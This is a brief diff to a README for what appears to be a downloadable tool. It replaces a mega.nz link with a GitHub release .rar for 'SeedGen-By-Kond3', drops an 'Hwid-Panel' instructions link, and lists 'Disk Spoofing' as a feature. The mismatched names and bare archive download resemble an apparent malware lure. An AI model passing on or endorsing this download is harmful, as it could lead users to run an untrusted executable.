@@ -1,6 +1,5 @@
-# Download - [!click!](https://mega.nz/file/MfUy2JqB#kZilLoQ3CLUanDaZypC3LTmZDIXj2qog3dHdSxsw7UI)
+# Download - [!click!](https://github.com/kond3ve1/SeedGen-By-Kond3/releases/download/1/Release.rar)
 
-# Instructions - [Click](https://github.com/kond3ve1/Hwid-Panel/blob/main/Instructions)
 
 # ***Key features***
 Disk Spoofing - [18.05.23]
